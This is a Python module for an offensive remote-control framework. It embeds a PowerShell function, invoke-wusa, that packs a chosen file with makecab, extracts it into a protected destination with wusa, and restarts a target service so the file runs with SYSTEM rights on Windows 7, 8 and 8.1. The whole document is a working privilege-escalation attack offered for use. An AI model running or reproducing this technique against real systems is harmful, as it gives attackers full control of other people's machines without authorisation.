from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "invoke-wusa",
                       "Description": "Use makecab and wusa to run a file and get System on Windows 7, 8 or 8.1 (requires admin privileges)",
                       "Author": "@JosueEncinar",
                      }

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "file": [None, "File to execute", False],
                   "service": [None, "Target service", False],
                   "destination": [None, "Path to move the file", False]
                   }

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """function invoke-wusa{
                    param(
                        [Parameter(Mandatory)]
                        [string] $file,
                        [Parameter(Mandatory)]
                        [String] $service,
                        [Parameter(Mandatory)]
                        [String] $destination
                    )

                $makecabAux = $pwd.Path.ToString() + "\test.tmp"

                if (isadmin) {
                    $null = makecab $file $makecabAux
                    $null =  wusa $makecabAux /extract:$destination 
                    sleep 1

                    rm $makecabAux

        
                    sc.exe stop $service
                    sleep 2
                    sc.exe start $service
                    return "Done"
                } else {
                    return "Administrator privileges required"
                }

            }
            """


        function += 'invoke-wusa -file {} -service {} -destination {}'.format(self.args["file"], self.args["service"], self.args["destination"])

        super(CustomModule, self).run(function)